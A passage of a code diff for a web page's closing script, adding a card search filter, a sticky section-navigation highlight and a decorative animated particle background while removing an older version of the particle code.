+searchBox.addEventListener('input',()=>{
+  const q=searchBox.value.toLowerCase().trim();
+  document.querySelectorAll('.card').forEach(c=>{
+    const txt=c.textContent.toLowerCase();
+    c.classList.toggle('hidden',q!==''&&!txt.includes(q));
+  });
+  document.querySelectorAll('.psec').forEach(s=>{
+    if(q===''){s.style.display='';return;}
+    const visible=s.querySelectorAll('.card:not(.hidden)');
+    s.style.display=visible.length===0&&s.querySelector('.cgrid')?'none':'';
+  });
+});
+
+// ==================== STICKY NAV HIGHLIGHT ====================
+const secs=document.querySelectorAll('.psec');
+const navBtns=document.querySelectorAll('.pnb');
+const obs=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const id=e.target.id.replace('ph-','');
+      navBtns.forEach(b=>b.classList.toggle('active',b.dataset.id==id));
     }
   });
-}, { rootMargin: '-40% 0px -55% 0px' });
-sections.forEach(s => observer.observe(s));
+},{rootMargin:'-35% 0px -60% 0px'});
+secs.forEach(s=>obs.observe(s));
 
-// ===================== 3D PARTICLE CANVAS =====================
-const canvas = document.getElementById('bg-canvas');
-const ctx = canvas.getContext('2d');
-let W, H, particles;
+// ==================== PARTICLE CANVAS ====================
+const canvas=document.getElementById('bgc');
+const ctx=canvas.getContext('2d');
+let W,H;
+function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;}
+resize();window.addEventListener('resize',resize);
 
-function resize() {
-  W = canvas.width = window.innerWidth;
-  H = canvas.height = window.innerHeight;
+class P{
+  constructor(){this.reset();}
+  reset(){
+    this.x=Math.random()*W;this.y=Math.random()*H;
+    this.z=Math.random()*2+0.2;
+    this.vx=(Math.random()-.5)*.25*this.z;this.vy=(Math.random()-.5)*.25*this.z;
+    this.r=Math.random()*1.4+0.3;
+    this.c=['#6c63ff','#ff6584','#43e97b','#4cc9f0','#f9c74f','#f72585'][Math.floor(Math.random()*6)];
+    this.a=Math.random()*.5+.1;
+  }
+  update(){this.x+=this.vx;this.y+=this.vy;if(this.x<0||this.x>W||this.y<0||this.y>H)this.reset();}
+  draw(){ctx.globalAlpha=this.a;ctx.fillStyle=this.c;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fill();}
 }
-resize();
-window.addEventListener('resize', resize);
-
-class Particle {
-  constructor() { this.reset(); }
-  reset() {
-    this.x = Math.random() * W;
-    this.y = Math.random() * H;
-    this.z = Math.random() * 2 + 0.2;
-    this.vx = (Math.random() - 0.5) * 0.3 * this.z;
-    this.vy = (Math.random() - 0.5) * 0.3 * this.z;
-    this.r = Math.random() * 1.5 + 0.4;
-    this.color = ['#6c63ff','#ff6584','#43e97b','#4cc9f0','#f9c74f'][Math.floor(Math.random()*5)];
-    this.alpha = Math.random() * 0.6 + 0.1;
-  }
-  update() {
-    this.x += this.vx; this.y += this.vy;
-    if (this.x < 0 || this.x > W || this.y < 0 || this.y > H) this.reset();
-  }
-  draw() {
-    ctx.globalAlpha = this.alpha;
-    ctx.fillStyle = this.color;
-    ctx.beginPath();
-    ctx.arc(this.x, this.y, this.r * this.z, 0, Math.PI * 2);
-    ctx.fill();
+const pts=Array.from({length:160},()=>new P());
+function drawLines(){
+  for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){
+    const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);
+    if(d<90){ctx.globalAlpha=(1-d/90)*.07;ctx.strokeStyle='#6c63ff';ctx.lineWidth=.4;ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.stroke();}
   }
 }
-
-particles = Array.from({ length: 180 }, () => new Particle());
-
-function drawConnections() {
-  const maxDist = 100;
-  for (let i = 0; i < particles.length; i++) {
-    for (let j = i + 1; j < particles.length; j++) {
-      const dx = particles[i].x - particles[j].x;
-      const dy = particles[i].y - particles[j].y;
-      const d = Math.sqrt(dx*dx + dy*dy);
-      if (d < maxDist) {
-        ctx.globalAlpha = (1 - d/maxDist) * 0.08;
-        ctx.strokeStyle = '#6c63ff';
-        ctx.lineWidth = 0.5;
-        ctx.beginPath();
-        ctx.moveTo(particles[i].x, particles[i].y);
-        ctx.lineTo(particles[j].x, particles[j].y);
-        ctx.stroke();
-      }
-    }
-  }
+function anim(){
+  ctx.clearRect(0,0,W,H);drawLines();
+  pts.forEach(p=>{p.update();p.draw();});
+  ctx.globalAlpha=1;requestAnimationFrame(anim);
 }
-
-function animate() {
-  ctx.clearRect(0, 0, W, H);
-  drawConnections();
-  particles.forEach(p => { p.update(); p.draw(); });
-  ctx.globalAlpha = 1;
-  requestAnimationFrame(animate);
-}
-animate();
+anim();
 </script>
 </body>
 </html>
